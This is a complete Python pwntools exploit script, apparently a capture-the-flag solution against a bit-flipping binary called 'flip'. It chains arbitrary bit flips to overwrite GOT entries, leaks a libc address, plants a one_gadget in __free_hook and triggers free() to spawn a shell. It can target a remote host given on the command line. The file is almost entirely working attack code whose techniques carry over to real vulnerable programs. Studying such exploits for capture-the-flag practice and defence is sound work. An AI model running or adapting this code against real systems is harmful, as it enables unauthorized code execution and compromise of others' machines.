from pwn import *

flip_count = 0

def find_bit_flips(a, b):
    tmp = bytearray(bin(a ^ b)[2:][::-1])
    ret = []

    #print "a: {}".format(bin(a))
    #print "b: {}".format(bin(b))
    #print tmp
    while True:
        try:
            i = tmp.index("1")
            ret.append(i)
            tmp[i] = "0"
        except ValueError:
            break

    return ret


def arbitrary_write(addr, value, old_value):
    global flip_count
    flips = find_bit_flips(old_value, value)
    #print flips
    for flip in flips[::-1]:
        addr2 = addr + (flip / 8)
        flip2 = flip % 8
        r.recvuntil("to flip: ")
        #log.info("{} ({}): {:#x}".format(flip, flip2, addr2))
        r.sendline("{:#x}:{}".format(addr2, flip2))
        flip_count += 1


# we need to pad our flips when changing functions that will be called during
# the next "round"
def pad_flips():
    global flip_count
    #print flip_count
    for i in range(5 - (flip_count % 5)):
        r.recvuntil("to flip: ")
        r.sendline("{:#x}:{}".format(elf.got["__stack_chk_fail"], 0))

binary = "./flip"
if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(binary)
elf = ELF(binary)
libc = ELF("./libc.so.6")

# 1. turn exit@GOT into _start
# 2. change welcome_str to point to something juicy >:)
# 3. we can now flip arbitrary bits, and we have an info leak!
# 4. change asctime into a nop
# 5. change localtime into a nop
# 6. change __free_hook into a one_gadget with constraint rsp+0x70 == NULL
# 7. change localtime back
# 8. trigger a call to localtime, which calls free, which calls one_gadget
# 9. shell!

exit = elf.plt["exit"] + 6
log.info("exit: {:#x}".format(exit))
target = elf.symbols["_start"]

arbitrary_write(elf.got["exit"], target, exit)

welcome_str = elf.symbols["welcome_str"]
welcome_str_addr = 0x400b51
target = elf.got["puts"]
arbitrary_write(welcome_str, target, welcome_str_addr)
pad_flips()

r.recvuntil("Have a nice day :)\n")
leak = u64(r.recvline()[:-1].ljust(8, "\x00"))
log.info("leak: {:#x}".format(leak))
libc_base = leak - libc.symbols["puts"]
log.success("libc base: {:#x}".format(libc_base))

one_gadgets = map(lambda x: x + libc_base, [ 0x4f2c5, 0x4f322, 0x10a38c ])

# turn asctime into a nop to avoid crashes because we've turned
# localtime into a nop
ret = libc_base + libc.symbols["asctime"] - 0x2c
arbitrary_write(elf.got["asctime"], ret, libc_base + libc.symbols["asctime"])
pad_flips()

# turn localtime into a nop to avoid calls to free() while we're
# overwriting __free_hook
ret = libc_base + libc.symbols["localtime"] - 0x60
arbitrary_write(elf.got["localtime"], ret, libc_base + libc.symbols["localtime"])

# now we can safely overwrite __free_hook without any crashes
arbitrary_write(libc_base + libc.symbols["__free_hook"],
                one_gadgets[2], 0x00)
pad_flips()

# now we can fix up localtime so that it ends up calling free(), which in turn
# will call our selected one_gadget through __free_hook
arbitrary_write(elf.got["localtime"], libc_base + libc.symbols["localtime"], ret)
r.recvuntil("to flip: ")

r.sendline("0x601010:8") # trigger early exit
log.success("enjoy your shell! <3")
#r.sendline("cat flag.txt")

r.interactive()
